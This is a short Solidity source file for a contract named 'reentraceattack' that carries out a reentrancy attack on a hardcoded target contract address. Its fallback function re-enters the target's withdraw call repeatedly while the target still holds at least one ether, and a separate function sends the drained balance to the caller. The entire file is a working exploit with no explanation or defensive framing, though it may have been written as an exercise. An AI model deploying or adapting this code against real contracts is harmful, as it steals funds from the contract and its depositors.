pragma solidity 0.6.6;

interface ss
{
    function withdraw(uint amount) external payable;
    function check_balance() external view returns(uint);
    function deposit() external payable;
}


contract reentraceattack
{
   
    ss target = ss(0x99CF4c4CAE3bA61754Abd22A8de7e8c7ba3C196d);
    uint amount = 1 ether;

    function attack() public payable
    {
        
        target.withdraw(amount);
    }

    function deposit(uint amount) public payable
    {
        target.deposit.value(amount)();
    }

    function retreieve() public 
    {
        msg.sender.transfer(address(this).balance);
    }

    function check_balance() public view returns(uint)
    {
        uint s = target.check_balance();
        return s;
    }

    function chec_bal() public view returns(uint)
    {
        return address(target).balance;
    }


    fallback() external payable
    {
        if(address(target).balance >= amount )
        {
            target.withdraw(amount);
        }
    }
}
